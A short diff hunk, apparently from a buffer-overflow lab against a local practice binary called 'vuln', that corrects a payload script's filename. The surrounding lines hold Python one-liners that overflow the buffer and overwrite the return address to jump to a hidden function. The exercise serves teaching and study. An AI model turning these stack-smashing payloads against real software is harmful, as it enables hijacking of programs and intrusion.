@@ -106,7 +106,7 @@ python3 -c 'import os; os.write(1, 0x40*b"A" + b"\x5a\x5a\x5a\x5a")' | ./vuln
 
 # Overwrite return address. Print message "Channel open."
 # nm vuln +> & of secret func is 0x080491a7
-python3 payload_secret_func | ./vuln
+python3 payload_secret_func.py | ./vuln
 python3 -c 'import os; os.write(1, 0x48*b"A" + b"\xa7\x91\x04\x08")' | ./vuln
 
 # Overwrite return address with function parameters. Print message "Systems functional."
